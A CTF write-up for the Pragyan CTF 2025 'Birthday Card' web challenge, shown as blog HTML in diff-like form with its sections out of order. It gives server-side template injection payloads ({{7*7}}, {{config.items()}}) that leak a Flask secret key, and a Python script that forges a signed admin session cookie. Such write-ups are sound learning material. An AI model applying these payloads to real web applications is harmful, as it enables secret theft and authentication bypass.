-</span></span></code></pre></div></details><h3 id=used-of-jinja>Used of Jinja</h3><p>I quickly glanced through the code and saw <code>Jinja</code></p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-python data-lang=python><span style=display:flex><span>            app<span style=color:#f92672>.</span>jinja_env <span style=color:#f92672>=</span> env    
-</span></span><span style=display:flex><span>            app<span style=color:#f92672>.</span>jinja_env<span style=color:#f92672>.</span>globals<span style=color:#f92672>.</span>update({
-</span></span><span style=display:flex><span>                <span style=color:#e6db74>&#39;validator&#39;</span>: validator()
-</span></span><span style=display:flex><span>            })
-</span></span><span style=display:flex><span>            <span style=color:#66d9ef>return</span> render_template_string(template)
-</span></span></code></pre></div><p>This immediately made me think of Server-side Template Injection (SSTI), so I quickly returned to the target site and tested <code>{{ '{{' }} 7*7 }}</code> and indeed SSTI, is possible</p><p><img src=/images/BirthdayCard-1.png alt="Image Description"></p><h3 id=sanitization>Sanitization</h3><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-python data-lang=python><span style=display:flex><span><span style=color:#66d9ef>class</span> <span style=color:#a6e22e>validator</span>:
-</span></span><span style=display:flex><span>    <span style=color:#66d9ef>def</span> <span style=color:#a6e22e>security</span>():
-</span></span><span style=display:flex><span>        <span style=color:#66d9ef>return</span> _b
-</span></span><span style=display:flex><span>    <span style=color:#66d9ef>def</span> <span style=color:#a6e22e>security1</span>(a, b, c, d):
-</span></span><span style=display:flex><span>        <span style=color:#66d9ef>if</span> <span style=color:#e6db74>&#39;validator&#39;</span> <span style=color:#f92672>in</span> a <span style=color:#f92672>or</span> <span style=color:#e6db74>&#39;validator&#39;</span> <span style=color:#f92672>in</span> b <span style=color:#f92672>or</span> <span style=color:#e6db74>&#39;validator&#39;</span> <span style=color:#f92672>in</span> c <span style=color:#f92672>or</span> <span style=color:#e6db74>&#39;validator&#39;</span> <span style=color:#f92672>in</span> d:
-</span></span><span style=display:flex><span>            <span style=color:#66d9ef>return</span> <span style=color:#66d9ef>False</span>
-</span></span><span style=display:flex><span>        <span style=color:#66d9ef>elif</span> <span style=color:#e6db74>&#39;os&#39;</span> <span style=color:#f92672>in</span> a <span style=color:#f92672>or</span> <span style=color:#e6db74>&#39;os&#39;</span> <span style=color:#f92672>in</span> b <span style=color:#f92672>or</span> <span style=color:#e6db74>&#39;os&#39;</span> <span style=color:#f92672>in</span> c <span style=color:#f92672>or</span> <span style=color:#e6db74>&#39;os&#39;</span> <span style=color:#f92672>in</span> d:
-</span></span><span style=display:flex><span>            <span style=color:#66d9ef>return</span> <span style=color:#66d9ef>False</span>
-</span></span><span style=display:flex><span>        <span style=color:#66d9ef>else</span>:
-</span></span><span style=display:flex><span>            <span style=color:#66d9ef>return</span> <span style=color:#66d9ef>True</span>
-</span></span><span style=display:flex><span>    
-</span></span><span style=display:flex><span>    <span style=color:#66d9ef>def</span> <span style=color:#a6e22e>security2</span>(a, b, c, d):
-</span></span><span style=display:flex><span>        <span style=color:#66d9ef>if</span> len(a) <span style=color:#f92672>&lt;=</span> <span style=color:#ae81ff>50</span> <span style=color:#f92672>and</span> len(b) <span style=color:#f92672>&lt;=</span> <span style=color:#ae81ff>50</span> <span style=color:#f92672>and</span> len(c) <span style=color:#f92672>&lt;=</span> <span style=color:#ae81ff>50</span> <span style=color:#f92672>and</span> len(d) <span style=color:#f92672>&lt;=</span> <span style=color:#ae81ff>50</span>:
-</span></span><span style=display:flex><span>            <span style=color:#66d9ef>return</span> <span style=color:#66d9ef>True</span>
-</span></span><span style=display:flex><span>        <span style=color:#66d9ef>else</span> :
-</span></span><span style=display:flex><span>            <span style=color:#66d9ef>return</span> <span style=color:#66d9ef>False</span>
-</span></span></code></pre></div><p>This ensures that the input doesn&rsquo;t contain the string <code>validator</code> or <code>os</code>, and that it has a maximum length of 50 characters.</p><p>To solve this challenge, we don&rsquo;t need to bypass these checks, but they are needed in the harder version of the challenge(Deathday Card).</p><p>For that I highly recommend reading this: <a href=https://nullbrunk.github.io/posts/pragyan-deathdaycard/>Nullbrunk Write-up for the Deathday Card Challenge</a>.</p><p>Going back to the challenge&mldr;</p><h3 id=adminreport-endpoint>/admin/report endpoint</h3><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-python data-lang=python><span style=display:flex><span><span style=color:#a6e22e>@app.route</span>(<span style=color:#e6db74>&#34;/admin/report&#34;</span>)
-</span></span><span style=display:flex><span><span style=color:#66d9ef>def</span> <span style=color:#a6e22e>admin_report</span>():
-</span></span><span style=display:flex><span>
-</span></span><span style=display:flex><span>    <span style=color:#75715e># Checks if the `Cookie` header contains a cookie-name called `session`</span>
-</span></span><span style=display:flex><span>    <span style=color:#75715e># If not it returns a 403</span>
-</span></span><span style=display:flex><span>    auth_cookie <span style=color:#f92672>=</span> request<span style=color:#f92672>.</span>cookies<span style=color:#f92672>.</span>get(<span style=color:#e6db74>&#34;session&#34;</span>)
-</span></span><span style=display:flex><span>    <span style=color:#66d9ef>if</span> <span style=color:#f92672>not</span> auth_cookie:
-</span></span><span style=display:flex><span>        abort(<span style=color:#ae81ff>403</span>, <span style=color:#e6db74>&#34;Unauthorized access.&#34;</span>)
-</span></span><span style=display:flex><span>
-</span></span><span style=display:flex><span>
-</span></span><span style=display:flex><span>
-</span></span><span style=display:flex><span>    <span style=color:#66d9ef>try</span>:
-</span></span><span style=display:flex><span>        <span style=color:#75715e># This means that the cookie-value would look like --&gt; token.signature</span>
-</span></span><span style=display:flex><span>        token, signature <span style=color:#f92672>=</span> auth_cookie<span style=color:#f92672>.</span>rsplit(<span style=color:#e6db74>&#34;.&#34;</span>, <span style=color:#ae81ff>1</span>)
-</span></span><span style=display:flex><span>
-</span></span><span style=display:flex><span>        <span style=color:#75715e># This indicates that there is a file called sign.py</span>
-</span></span><span style=display:flex><span>        <span style=color:#f92672>from</span> app.sign <span style=color:#f92672>import</span> initFn
-</span></span><span style=display:flex><span>
-</span></span><span style=display:flex><span>        <span style=color:#75715e># KEY = os.getenv(&#34;APP_SECRET_KEY&#34;, &#34;default_secret_key&#34;)</span>
-</span></span><span style=display:flex><span>        signer <span style=color:#f92672>=</span> initFn(KEY)
-</span></span><span style=display:flex><span>
-</span></span><span style=display:flex><span>        <span style=color:#75715e>#Creating a valid signature</span>
-</span></span><span style=display:flex><span>        sign_token_function <span style=color:#f92672>=</span> signer<span style=color:#f92672>.</span>get_signer()
-</span></span><span style=display:flex><span>        valid_signature <span style=color:#f92672>=</span> sign_token_function(token)
-</span></span><span style=display:flex><span>
-</span></span><span style=display:flex><span>        <span style=color:#75715e># Checks if the signature from the cookie-value is not the same as the created valid_signature</span>
-</span></span><span style=display:flex><span>        <span style=color:#75715e># If False then it continues but if True then it returns a 403</span>
-</span></span><span style=display:flex><span>        <span style=color:#66d9ef>if</span> valid_signature <span style=color:#f92672>!=</span> signature:
-</span></span><span style=display:flex><span>            abort(<span style=color:#ae81ff>403</span>, <span style=color:#e6db74>f</span><span style=color:#e6db74>&#34;Invalid token.&#34;</span>)
-</span></span><span style=display:flex><span>
-</span></span><span style=display:flex><span>        
-</span></span><span style=display:flex><span>        <span style=color:#75715e># If the first part of the cookie-value is equal to &#34;admin&#34; then it gives us the flag.</span>
-</span></span><span style=display:flex><span>        <span style=color:#75715e># If not then it returns a 403</span>
-</span></span><span style=display:flex><span>        <span style=color:#66d9ef>if</span> token <span style=color:#f92672>==</span> <span style=color:#e6db74>&#34;admin&#34;</span>: <span style=color:#75715e># We now know that the token is &#34;admin&#34;</span>
-</span></span><span style=display:flex><span>            <span style=color:#66d9ef>return</span> <span style=color:#e6db74>&#34;Flag: p_ctf</span><span style=color:#e6db74>{redacted}</span><span style=color:#e6db74>&#34;</span>
-</span></span><span style=display:flex><span>        <span style=color:#66d9ef>else</span>:
-</span></span><span style=display:flex><span>            <span style=color:#66d9ef>return</span> <span style=color:#e6db74>&#34;Access denied: admin only.&#34;</span>
-</span></span><span style=display:flex><span>    <span style=color:#66d9ef>except</span> <span style=color:#a6e22e>Exception</span> <span style=color:#66d9ef>as</span> e:
-</span></span><span style=display:flex><span>        abort(<span style=color:#ae81ff>403</span>, <span style=color:#e6db74>f</span><span style=color:#e6db74>&#34;Invalid token format: </span><span style=color:#e6db74>{</span>e<span style=color:#e6db74>}</span><span style=color:#e6db74>&#34;</span>)
-</span></span></code></pre></div><p><em><strong>Please read the comments for my explanation of what the code is doing</strong></em></p><p>With this, to get the flag we just need to generate a valid session:</p><ul><li><code>Token</code> = <code>"admin"</code></li><li><code>Key</code> = <code>unknown</code></li><li><code>Algorithm</code> used to generate a valid signature = <code>unknown</code></li></ul><p>Since we have an SSTI it was pretty easy to leak the value of <code>KEY</code></p><p>By using this payload: <code>{{ '{{' }}config.items()}}</code> I was able to leak it :P</p><p><img src=/images/BirthdayCard-2.png alt="Image Description"></p><p>So we now have this:</p><ul><li><code>Token</code> = <code>"admin"</code></li><li><code>Key</code> = <code>"dsbfeif3uwf6bes878hgi"</code></li><li><code>Algorithm</code> used to generate a valid signature = <code>unknown</code></li></ul><p>For the last part I actually just guessed it xD I figured I&rsquo;d try to use HMAC-SHA-256 since it&rsquo;s a common choice to generate a signature.</p><h2 id=genpy>gen.py</h2><p>With all of that, I created this script.</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-python data-lang=python><span style=display:flex><span><span style=color:#f92672>import</span> hmac
-</span></span><span style=display:flex><span><span style=color:#f92672>import</span> hashlib
-</span></span><span style=display:flex><span>
-</span></span><span style=display:flex><span><span style=color:#75715e># Secret key</span>
-</span></span><span style=display:flex><span>KEY <span style=color:#f92672>=</span> <span style=color:#e6db74>b</span><span style=color:#e6db74>&#34;dsbfeif3uwf6bes878hgi&#34;</span>
-</span></span><span style=display:flex><span>
-</span></span><span style=display:flex><span><span style=color:#75715e># Token</span>
-</span></span><span style=display:flex><span>token <span style=color:#f92672>=</span> <span style=color:#e6db74>&#34;admin&#34;</span>
-</span></span><span style=display:flex><span>
-</span></span><span style=display:flex><span>signature <span style=color:#f92672>=</span> hmac<span style=color:#f92672>.</span>new(KEY, token<span style=color:#f92672>.</span>encode(), hashlib<span style=color:#f92672>.</span>sha256)<span style=color:#f92672>.</span>hexdigest()
-</span></span><span style=display:flex><span>auth_cookie <span style=color:#f92672>=</span> <span style=color:#e6db74>f</span><span style=color:#e6db74>&#34;</span><span style=color:#e6db74>{</span>token<span style=color:#e6db74>}</span><span style=color:#e6db74>.</span><span style=color:#e6db74>{</span>signature<span style=color:#e6db74>}</span><span style=color:#e6db74>&#34;</span>
-</span></span><span style=display:flex><span>
-</span></span><span style=display:flex><span>print(auth_cookie)
-</span></span></code></pre></div><p>Running <code>gen.py</code> returns -> <code>admin.dc92ab47061ce7a0922596817589737de0b8dde08e7fbe6c7772ad5f87ea9f0b</code></p><h2 id=flag>Flag</h2><p>To check if that is a valid <code>cookie-value</code>, I used it and made a request to <code>/admin/report</code> and&mldr;</p><p><img src=/images/BirthdayCard-3.png alt="Image Description"></p><p>Finally, we got the <code>Flag: p_ctf{S3rVer_STI_G0es_hArd}</code></p><p>That&rsquo;s all for this write-up! Thanks for reading, and have a nice day :D</p><p>-<em><strong>Datsuraku147</strong></em></p></div></article></main></div><footer class=footer><span class=footer_item></span>&nbsp;<div class=footer_social-icons><a href=http://github.com/datsuraku147 target=_blank rel="noopener noreferrer me" title=Github><svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M9 19c-5 1.5-5-2.5-7-3m14 6v-3.87a3.37 3.37.0 00-.94-2.61c3.14-.35 6.44-1.54 6.44-7A5.44 5.44.0 0020 4.77 5.07 5.07.0 0019.91 1S18.73.65 16 2.48a13.38 13.38.0 00-7 0C6.27.65 5.09 1 5.09 1A5.07 5.07.0 005 4.77 5.44 5.44.0 003.5 8.55c0 5.42 3.3 6.61 6.44 7A3.37 3.37.0 009 18.13V22"/></svg>
-</a><a href=https://x.com/MDatsuraku target=_blank rel="noopener noreferrer me" title=Twitter><svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M23 3a10.9 10.9.0 01-3.14 1.53 4.48 4.48.0 00-7.86 3v1A10.66 10.66.0 013 4s-4 9 5 13a11.64 11.64.0 01-7 2c9 5 20 0 20-11.5a4.5 4.5.0 00-.08-.83A7.72 7.72.0 0023 3z"/></svg>
-</a><a href=/index.xml target=_blank rel="noopener noreferrer me" title=Rss><svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M4 11a9 9 0 019 9"/><path d="M4 4a16 16 0 0116 16"/><circle cx="5" cy="19" r="1"/></svg></a></div><small class=footer_copyright>© 2025 Datsuraku.
-Powered by <a href=https://github.com/hugo-sid/hugo-blog-awesome target=_blank rel=noopener>Hugo blog awesome</a>.</small></footer><a href=# title="Go to top" id=totop><svg width="48" height="48" fill="currentColor" stroke="currentColor" viewBox="0 96 960 960"><path d="M283 704.739 234.261 656 480 410.261 725.739 656 677 704.739l-197-197-197 197z"/></svg>
-</a><script src=https://blog.datsuraku147.org/js/main.min.35f435a5d8eac613c52daa28d8af544a4512337d3e95236e4a4978417b8dcb2f.js integrity="sha256-NfQ1pdjqxhPFLaoo2K9USkUSM30+lSNuSkl4QXuNyy8="></script></body></html>
+My first thought is that the problem might be a sanitization issue since the only thing I can do is enter text to generate a card. Thankfully the challenge comes with the source appy.py">
+
+
+    
+
+    <link rel="canonical" href="http://localhost:1313/timeline/birthday-card/">
+    <link href="/style.min.2d921c18cf1ec555ffc03d59a8adc211c402c68c930c27d6a0c306ab175a8d09.css" rel="stylesheet">
+    <link href="/code-highlight.min.706d31975fec544a864cb7f0d847a73ea55ca1df91bf495fd12a177138d807cf.css" rel="stylesheet">
+
+    
+    <link rel="apple-touch-icon" sizes="180x180" href="/icons/apple-touch-icon.png">
+    <link rel="icon" type="image/png" sizes="32x32" href="/icons/favicon-32x32.png">
+    <link rel="icon" type="image/png" sizes="16x16" href="/icons/favicon-16x16.png">
+    <link rel="mask-icon" href="/icons/safari-pinned-tab.svg">
+    <link rel="shortcut icon" href="/favicon.ico">
+
+
+
+
+<link rel="manifest" href="http://localhost:1313/site.webmanifest">
+
+<meta name="msapplication-config" content="/browserconfig.xml">
+<meta name="msapplication-TileColor" content="#2d89ef">
+<meta name="theme-color" content="#434648">
+    <meta name="color-scheme" content="light dark">
+
+    
+    <link rel="icon" type="image/svg+xml" href="/icons/favicon.svg">
+
+    
+    
+</head>
+<body data-theme = "dark" class="notransition">
+
+<script src="/js/theme.js"></script>
+
+<div class="navbar" role="navigation">
+    <nav class="menu" aria-label="Main Navigation">
+        <a href="http://localhost:1313/" class="logo">
+            <svg xmlns="http://www.w3.org/2000/svg" width="25" height="25" 
+viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" 
+stroke-linejoin="round" class="feather feather-home">
+<title>Home</title>
+<path d="M3 9l9-7 9 7v11a2 2 0 0 1-2 2H5a2 2 0 0 1-2-2z"></path>
+<polyline points="9 22 9 12 15 12 15 22"></polyline>
+</svg>
+        </a>
+        <input type="checkbox" id="menu-trigger" class="menu-trigger" />
+        <label for="menu-trigger">
+            <span class="menu-icon">
+                <svg xmlns="http://www.w3.org/2000/svg" width="25" height="25" stroke="currentColor" fill="none" viewBox="0 0 14 14"><title>Menu</title><path stroke-linecap="round" stroke-linejoin="round" d="M10.595 7L3.40726 7"></path><path stroke-linecap="round" stroke-linejoin="round" d="M10.5096 3.51488L3.49301 3.51488"></path><path stroke-linecap="round" stroke-linejoin="round" d="M10.5096 10.4851H3.49301"></path><path stroke-linecap="round" stroke-linejoin="round" d="M0.5 12.5V1.5C0.5 0.947715 0.947715 0.5 1.5 0.5H12.5C13.0523 0.5 13.5 0.947715 13.5 1.5V12.5C13.5 13.0523 13.0523 13.5 12.5 13.5H1.5C0.947715 13.5 0.5 13.0523 0.5 12.5Z"></path></svg>
+            </span>
+        </label>
+
+        <div class="trigger">
+            <ul class="trigger-container">
+                
+                
+                <li>
+                    <a class="menu-link " href="/categories/">
+                        Categories
+                    </a>
+                    
+                </li>
+                
+                <li>
+                    <a class="menu-link " href="/tags/">
+                        Tags
+                    </a>
+                    
+                </li>
+                
+                <li>
+                    <a class="menu-link active" href="/timeline/">
+                        Timeline
+                    </a>
+                    
+                </li>
+                
+                <li>
+                    <a class="menu-link " href="/crong/">
+                        Me???
+                    </a>
+                    
+                </li>
+                
+                <li class="menu-separator">
+                    <span>|</span>
+                </li>
+                
+                
+            </ul>
+            <a id="mode" href="#">
+                <svg xmlns="http://www.w3.org/2000/svg" class="mode-sunny" width="21" height="21" viewBox="0 0 14 14" stroke-width="1">
+<title>LIGHT</title><g><circle cx="7" cy="7" r="2.5" fill="none" stroke-linecap="round" stroke-linejoin="round"></circle><line x1="7" y1="0.5" x2="7" y2="2.5" fill="none" stroke-linecap="round" stroke-linejoin="round"></line><line x1="2.4" y1="2.4" x2="3.82" y2="3.82" fill="none" stroke-linecap="round" stroke-linejoin="round"></line><line x1="0.5" y1="7" x2="2.5" y2="7" fill="none" stroke-linecap="round" stroke-linejoin="round"></line><line x1="2.4" y1="11.6" x2="3.82" y2="10.18" fill="none" stroke-linecap="round" stroke-linejoin="round"></line><line x1="7" y1="13.5" x2="7" y2="11.5" fill="none" stroke-linecap="round" stroke-linejoin="round"></line><line x1="11.6" y1="11.6" x2="10.18" y2="10.18" fill="none" stroke-linecap="round" stroke-linejoin="round"></line><line x1="13.5" y1="7" x2="11.5" y2="7" fill="none" stroke-linecap="round" stroke-linejoin="round"></line><line x1="11.6" y1="2.4" x2="10.18" y2="3.82" fill="none" stroke-linecap="round" stroke-linejoin="round"></line></g></svg>
+                <svg xmlns="http://www.w3.org/2000/svg" class="mode-moon" width="21" height="21" viewBox="0 0 14 14" stroke-width="1">
+<title>DARK</title><g><circle cx="7" cy="7" r="2.5" fill="none" stroke-linecap="round" stroke-linejoin="round"></circle><line x1="7" y1="0.5" x2="7" y2="2.5" fill="none" stroke-linecap="round" stroke-linejoin="round"></line><line x1="2.4" y1="2.4" x2="3.82" y2="3.82" fill="none" stroke-linecap="round" stroke-linejoin="round"></line><line x1="0.5" y1="7" x2="2.5" y2="7" fill="none" stroke-linecap="round" stroke-linejoin="round"></line><line x1="2.4" y1="11.6" x2="3.82" y2="10.18" fill="none" stroke-linecap="round" stroke-linejoin="round"></line><line x1="7" y1="13.5" x2="7" y2="11.5" fill="none" stroke-linecap="round" stroke-linejoin="round"></line><line x1="11.6" y1="11.6" x2="10.18" y2="10.18" fill="none" stroke-linecap="round" stroke-linejoin="round"></line><line x1="13.5" y1="7" x2="11.5" y2="7" fill="none" stroke-linecap="round" stroke-linejoin="round"></line><line x1="11.6" y1="2.4" x2="10.18" y2="3.82" fill="none" stroke-linecap="round" stroke-linejoin="round"></line></g></svg>
+            </a>
+        </div>
+    </nav>
+</div>
+
+<div class="wrapper post">
+    <main class="page-content" aria-label="Content">
+        <article>
+            <header class="header">
+                <h1 class="header-title">Birthday Card - Pragyan CTF 2025</h1>
+                
+                
+                
+                <div class="post-meta">
+                    <time datetime="2025-02-11T00:00:00&#43;00:00" itemprop="datePublished"> Feb 11, 2025 </time>
+                </div>
+                
+            </header>
+            
+    
+    <details class="toc" ZgotmplZ>
+        <summary><b>Table of Contents</b></summary>
+        <nav id="TableOfContents">
+  <ul>
+    <li><a href="#introduction">Introduction</a></li>
+    <li><a href="#first-glance">First glance</a></li>
+    <li><a href="#apppy">App.py</a>
+      <ul>
+        <li><a href="#used-of-jinja">Used of Jinja</a></li>
+        <li><a href="#sanitization">Sanitization</a></li>
+        <li><a href="#adminreport-endpoint">/admin/report endpoint</a></li>
+      </ul>
+    </li>
+    <li><a href="#genpy">gen.py</a></li>
+    <li><a href="#flag">Flag</a></li>
+  </ul>
+</nav>
+    </details>
+            <div class="page-content">
+                <h2 id="introduction">Introduction</h2>
+<p>My knowledge about SSTI is little to none, so even though this was an easy challenge I still learned a lot! Kudos to the Pragyan Team for organizing the event.</p>
+<h2 id="first-glance">First glance</h2>
+<p>When I went to the target site, <code>https://birthday.ctf.prgy.in/</code>, I saw this:</p>
+<p><img src="/images/BirthdayCard-0.png" alt="Image Description"></p>
+<p>My first thought is that the problem might be a sanitization issue since the only thing I can do is enter text to generate a card. Thankfully the challenge comes with the source <code>appy.py</code></p>
+<h2 id="apppy">App.py</h2>
+<hr>
+<details>
+  <summary>FullApp.py</summary>
+  <div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span><span style="color:#f92672">from</span> flask <span style="color:#f92672">import</span> Flask, request, jsonify, abort, render_template_string, session, redirect
+</span></span><span style="display:flex;"><span><span style="color:#f92672">import</span> builtins <span style="color:#66d9ef">as</span> _b
+</span></span><span style="display:flex;"><span><span style="color:#f92672">import</span> sys
+</span></span><span style="display:flex;"><span><span style="color:#f92672">import</span> os
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>app <span style="color:#f92672">=</span> Flask(__name__)
+</span></span><span style="display:flex;"><span>app<span style="color:#f92672">.</span>secret_key <span style="color:#f92672">=</span> os<span style="color:#f92672">.</span>getenv(<span style="color:#e6db74">&#34;APP_SECRET_KEY&#34;</span>, <span style="color:#e6db74">&#34;default_app_secret&#34;</span>)
+</span></span><span style="display:flex;"><span>env <span style="color:#f92672">=</span> app<span style="color:#f92672">.</span>jinja_env
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>KEY <span style="color:#f92672">=</span> os<span style="color:#f92672">.</span>getenv(<span style="color:#e6db74">&#34;APP_SECRET_KEY&#34;</span>, <span style="color:#e6db74">&#34;default_secret_key&#34;</span>)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">class</span> <span style="color:#a6e22e">validator</span>:
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">def</span> <span style="color:#a6e22e">security</span>():
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">return</span> _b
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">def</span> <span style="color:#a6e22e">security1</span>(a, b, c, d):
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">if</span> <span style="color:#e6db74">&#39;validator&#39;</span> <span style="color:#f92672">in</span> a <span style="color:#f92672">or</span> <span style="color:#e6db74">&#39;validator&#39;</span> <span style="color:#f92672">in</span> b <span style="color:#f92672">or</span> <span style="color:#e6db74">&#39;validator&#39;</span> <span style="color:#f92672">in</span> c <span style="color:#f92672">or</span> <span style="color:#e6db74">&#39;validator&#39;</span> <span style="color:#f92672">in</span> d:
+</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">return</span> <span style="color:#66d9ef">False</span>
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">elif</span> <span style="color:#e6db74">&#39;os&#39;</span> <span style="color:#f92672">in</span> a <span style="color:#f92672">or</span> <span style="color:#e6db74">&#39;os&#39;</span> <span style="color:#f92672">in</span> b <span style="color:#f92672">or</span> <span style="color:#e6db74">&#39;os&#39;</span> <span style="color:#f92672">in</span> c <span style="color:#f92672">or</span> <span style="color:#e6db74">&#39;os&#39;</span> <span style="color:#f92672">in</span> d:
+</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">return</span> <span style="color:#66d9ef">False</span>
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">else</span>:
+</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">return</span> <span style="color:#66d9ef">True</span>
+</span></span><span style="display:flex;"><span>    
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">def</span> <span style="color:#a6e22e">security2</span>(a, b, c, d):
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">if</span> len(a) <span style="color:#f92672">&lt;=</span> <span style="color:#ae81ff">50</span> <span style="color:#f92672">and</span> len(b) <span style="color:#f92672">&lt;=</span> <span style="color:#ae81ff">50</span> <span style="color:#f92672">and</span> len(c) <span style="color:#f92672">&lt;=</span> <span style="color:#ae81ff">50</span> <span style="color:#f92672">and</span> len(d) <span style="color:#f92672">&lt;=</span> <span style="color:#ae81ff">50</span>:
+</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">return</span> <span style="color:#66d9ef">True</span>
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">else</span> :
+</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">return</span> <span style="color:#66d9ef">False</span>
+</span></span><span style="display:flex;"><span>        
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#a6e22e">@app.route</span>(<span style="color:#e6db74">&#34;/&#34;</span>, methods<span style="color:#f92672">=</span>[<span style="color:#e6db74">&#34;GET&#34;</span>, <span style="color:#e6db74">&#34;POST&#34;</span>])
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">def</span> <span style="color:#a6e22e">personalized_card</span>():
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">if</span> request<span style="color:#f92672">.</span>method <span style="color:#f92672">==</span> <span style="color:#e6db74">&#34;GET&#34;</span>:
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">return</span> <span style="color:#e6db74">&#34;&#34;&#34;
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">        &lt;link rel=&#34;stylesheet&#34; href=&#34;static/style.css&#34;&gt;
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">        &lt;link href=&#34;https://fonts.googleapis.com/css?family=Poppins:300,400,600&amp;display=swap&#34; rel=&#34;stylesheet&#34;&gt;
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">        &lt;div class=&#34;container&#34;&gt;
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">            &lt;div class=&#34;card-generator&#34;&gt;
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">                &lt;h1&gt;Personalized Card Generator&lt;/h1&gt;
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">                &lt;form action=&#34;/&#34; method=&#34;POST&#34;&gt;
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">                    &lt;label for=&#34;sender&#34;&gt;Sender&#39;s Name:&lt;/label&gt;
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">                    &lt;input type=&#34;text&#34; id=&#34;sender&#34; name=&#34;sender&#34; placeholder=&#34;Your name&#34; required maxlength=&#34;50&#34;&gt;
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">                    &lt;label for=&#34;recipient&#34;&gt;Recipient&#39;s Name:&lt;/label&gt;
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">                    &lt;input type=&#34;text&#34; id=&#34;recipient&#34; name=&#34;recipient&#34; placeholder=&#34;Recipient&#39;s name&#34; required maxlength=&#34;50&#34;&gt;
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">                    &lt;label for=&#34;message&#34;&gt;Message:&lt;/label&gt;
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">                    &lt;input type=&#34;text&#34; id=&#34;message&#34; name=&#34;message&#34; placeholder=&#34;Your message&#34; required maxlength=&#34;50&#34;&gt;
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">                    &lt;label for=&#34;message_final&#34;&gt;Final Message:&lt;/label&gt;
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">                    &lt;input type=&#34;text&#34; id=&#34;message_final&#34; name=&#34;message_final&#34; placeholder=&#34;Final words&#34; required maxlength=&#34;50&#34;&gt;
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">                    &lt;button type=&#34;submit&#34;&gt;Generate Card&lt;/button&gt;
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">                &lt;/form&gt;
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">            &lt;/div&gt;
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">        &lt;/div&gt;
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">        &#34;&#34;&#34;</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">elif</span> request<span style="color:#f92672">.</span>method <span style="color:#f92672">==</span> <span style="color:#e6db74">&#34;POST&#34;</span>:
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">try</span>:
+</span></span><span style="display:flex;"><span>            recipient <span style="color:#f92672">=</span> request<span style="color:#f92672">.</span>form<span style="color:#f92672">.</span>get(<span style="color:#e6db74">&#34;recipient&#34;</span>, <span style="color:#e6db74">&#34;&#34;</span>)
+</span></span><span style="display:flex;"><span>            sender <span style="color:#f92672">=</span> request<span style="color:#f92672">.</span>form<span style="color:#f92672">.</span>get(<span style="color:#e6db74">&#34;sender&#34;</span>, <span style="color:#e6db74">&#34;&#34;</span>)
+</span></span><span style="display:flex;"><span>            message <span style="color:#f92672">=</span> request<span style="color:#f92672">.</span>form<span style="color:#f92672">.</span>get(<span style="color:#e6db74">&#34;message&#34;</span>, <span style="color:#e6db74">&#34;&#34;</span>)
